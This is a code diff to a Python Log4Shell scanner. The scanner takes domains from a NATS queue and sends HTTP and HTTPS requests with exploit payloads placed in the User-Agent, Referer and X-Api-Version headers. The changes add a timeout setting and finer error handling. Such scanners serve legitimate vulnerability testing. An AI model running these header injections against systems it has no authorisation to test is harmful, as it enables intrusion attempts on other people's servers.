@@ -21,6 +21,7 @@ urllib3.disable_warnings()
 
 logging.basicConfig(stream=sys.stdout, level=logging.INFO)
 
+TIMEOUT = int(os.getenv("TIMEOUT", 1))
 NAME = os.getenv("NAME", "log4shell-scanner")
 SUBSCRIBE_TO = os.getenv("SUBSCRIBE_TO")
 PUBLISH_TO = os.getenv("PUBLISH_TO")
@@ -28,7 +29,8 @@ QUEUE_GROUP = os.getenv("QUEUE_GROUP")
 SERVERLIST = os.getenv("NATS_SERVERS")
 SERVERS = SERVERLIST.split(",")
 
-
+def to_json(msg):
+    print(json.dumps(msg, indent=2))
 
 def randomword(length):
     letters = string.ascii_lowercase
@@ -42,19 +44,22 @@ def payload(domain, header):
 def log4shell(domain):
     fakedomain = randomword(10)
     try:
-        params = {'id': payload(fakedomain, "params-id")}
         headers = {'User-Agent':payload(fakedomain, "User-Agent"), 'Referer':payload(fakedomain, "Referer"), 'X-Api-Version': payload(fakedomain, "X-Api-Version")}
-        response = requests.get(f"http://{domain}", headers=headers, params=params, verify=False, timeout=1)
-        if response.history == []:
-            response = requests.get(f"https://{domain}", headers=headers, params=params, verify=False, timeout=1)
+        response = requests.get(f"http://{domain}", headers=headers, timeout=TIMEOUT)
+        if not response.url.startswith('https'):
+            response = requests.get(f"https://{domain}", headers=headers, verify=False, timeout=TIMEOUT)
         to_json({'domain': domain, 'status': response.status_code, 'redirects': list(map(lambda res: res.url, response.history))})
+    except requests.exceptions.HTTPError as e:
+        to_json({'exception': True, 'status': e.response.status_code, 'reason': e.response.reason})
+    except requests.ConnectionError as e:
+        to_json({'exception': True,'unreachable': domain})
+    except requests.exceptions.ReadTimeout as e:
+        to_json({'exception': True,'timeout': domain})
     except requests.RequestException as e:
-        to_json({'exception': True, 'status': e.response.status_code, 'text': e.response.text})
+        print(e)
         pass
 
 
-def to_json(msg):
-    print(json.dumps(msg, indent=2))
 
 
 async def run(loop):
